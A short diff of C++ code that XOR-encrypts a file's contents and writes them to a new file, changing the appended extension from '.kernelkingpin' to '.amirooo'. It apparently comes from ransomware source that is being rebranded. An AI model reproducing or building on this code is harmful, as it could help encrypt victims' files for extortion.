@@ -20,7 +20,7 @@ void FileEncryptor::encryptFile(const std::string &filePath) {
   xorEncrypt(fileData, key);
 
   // Write encrypted data to new file with .kernelkingpin extension
-  std::string newFilePath = filePath + ".kernelkingpin";
+  std::string newFilePath = filePath + ".amirooo";
   std::ofstream outputFile(newFilePath, std::ios::binary);
   outputFile.write(fileData.data(), fileData.size());
   outputFile.close();
